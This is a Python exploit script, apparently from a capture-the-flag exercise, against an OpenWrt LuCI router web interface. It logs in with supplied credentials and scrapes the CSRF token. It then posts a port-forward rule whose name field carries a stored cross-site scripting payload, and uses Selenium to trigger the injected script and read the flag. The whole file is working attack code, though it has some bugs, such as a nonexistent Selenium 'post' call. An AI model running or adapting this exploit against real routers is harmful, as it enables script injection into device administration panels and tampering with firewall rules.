import requests
from selenium import webdriver
from selenium.webdriver.common.alert import Alert
import argparse
import re

def login_and_get_cookie(username, password, login_url):
    session = requests.Session()
    data = {'luci_username': username, 'luci_password': password}
    response = session.post(url=login_url, data=data, verify=False)
    
    if response.status_code == 200:
        print("登录成功！获取Cookie：")
        print(session.cookies.get_dict())
        return session
    else:
        print("登录失败！")
        return None
    
def get_token(session, upload_page_url):
    response = session.get(url=upload_page_url, verify=False)
    pattern = r'<input type="hidden" name="token" value="(.*?)" />'
    match = re.search(pattern, response.text)
    if match:
        token_value = match.group(1)
        print("获取到的Token：", token_value)
        return token_value
    else:
        print("Token未找到")
        return None
    
def upload_file(session, upload_url, token):
    headers ={"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://192.168.66.129", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryNQOIRGeyxBkDR6TH", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": "http://192.168.66.129/cgi-bin/luci/admin/network/firewall/forwards", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}

    # 使用bytes类型构建payload
    payload = (
        b"------WebKitFormBoundaryNQOIRGeyxBkDR6TH\r\n"
        b"Content-Disposition: form-data; name=\"token\"\r\n\r\n"
        + token.encode("utf-8") + b"\r\n"
        b"------WebKitFormBoundaryNQOIRGeyxBkDR6TH\r\n"
        b"Content-Disposition: form-data; name=\"cbi.submit\"\r\n\r\n1\r\n"
        b"------WebKitFormBoundaryNQOIRGeyxBkDR6TH\r\n"
        b"Content-Disposition: form-data; name=\"cbi.sts.firewall.redirect\"\r\n\r\n\r\n"
        b"------WebKitFormBoundaryNQOIRGeyxBkDR6TH\r\n"
        b"Content-Disposition: form-data; name=\"_newfwd.name\"\r\n\r\n<svg/onload=showMessage()//\r\n"
        b"------WebKitFormBoundaryNQOIRGeyxBkDR6TH\r\n"
        b"Content-Disposition: form-data; name=\"_newfwd.proto\"\r\n\r\ntcp udp\r\n"
        b"------WebKitFormBoundaryNQOIRGeyxBkDR6TH\r\n"
        b"Content-Disposition: form-data; name=\"_newfwd.extzone\"\r\n\r\nwan\r\n"
        b"------WebKitFormBoundaryNQOIRGeyxBkDR6TH\r\n"
        b"Content-Disposition: form-data; name=\"_newfwd.extport\"\r\n\r\n123\r\n"
        b"------WebKitFormBoundaryNQOIRGeyxBkDR6TH\r\n"
        b"Content-Disposition: form-data; name=\"_newfwd.intzone\"\r\n\r\nlan\r\n"
        b"------WebKitFormBoundaryNQOIRGeyxBkDR6TH\r\n"
        b"Content-Disposition: form-data; name=\"_newfwd.intaddr\"\r\n\r\n192.168.66.1\r\n"
        b"------WebKitFormBoundaryNQOIRGeyxBkDR6TH\r\n"
        b"Content-Disposition: form-data; name=\"_newfwd.intport\"\r\n\r\n123\r\n"
        b"------WebKitFormBoundaryNQOIRGeyxBkDR6TH\r\n"
        b"Content-Disposition: form-data; name=\"cbi.cts.firewall.redirect.\"\r\n\r\nAdd\r\n"
        b"------WebKitFormBoundaryNQOIRGeyxBkDR6TH--\r\n"


    )

    response = session.post(upload_url, data=payload, headers=headers)

    if response.status_code == 200:
        print("post 成功")
    else:
        print("post 失败！")
        print("响应状态码:", response.status_code)
        print("响应内容:", response.text)
def exploit(args):

        address = args.address
        username = args.username
        password = args.password
        session = requests.Session()
        login_url = 'http://%s/cgi-bin/luci/' % address
        upload_page_url="http://%s/cgi-bin/luci/admin/network/firewall/forwards" % address
        upload_url="http://%s/cgi-bin/luci/admin/network/firewall/forwards/cfg103837" % address
        # 登录获取Cookie
        session = login_and_get_cookie(username, password, login_url)
        if session:
            # 获取Token
            token = get_token(session, upload_page_url)
            if token:
                # 上传文件
                upload_file(session, upload_page_url, token)
        # 触发 xss，模拟点击 edit 键，以获取 flag
        driver = webdriver.Chrome()
        
        login_url = 'http://%s/cgi-bin/luci/' % address
        data = {'luci_username': username, 'luci_password': password}
        driver.post(url=login_url, data=data)
        # 发送GET请求
        url="http://%s/cgi-bin/luci/admin/network/firewall/forwards/cfg103837" % address
        driver.get(url)

        # 获取触发的alert
        alert = Alert(driver)
        alert_text = alert.text
        print(alert_text)

        # driver.quit()
def main():
    parser = argparse.ArgumentParser(description='xss_exp')
    requiredNamed = parser.add_argument_group('required named arguments')
    requiredNamed.add_argument('-a', '--address', help='Luci host address', required=True)
    requiredNamed.add_argument('-u', '--username', help='Luci username', required=True)
    requiredNamed.add_argument('-p', '--password', help='Luci password', required=True)
    args = parser.parse_args()
    exploit(args)
if __name__== "__main__":
    main()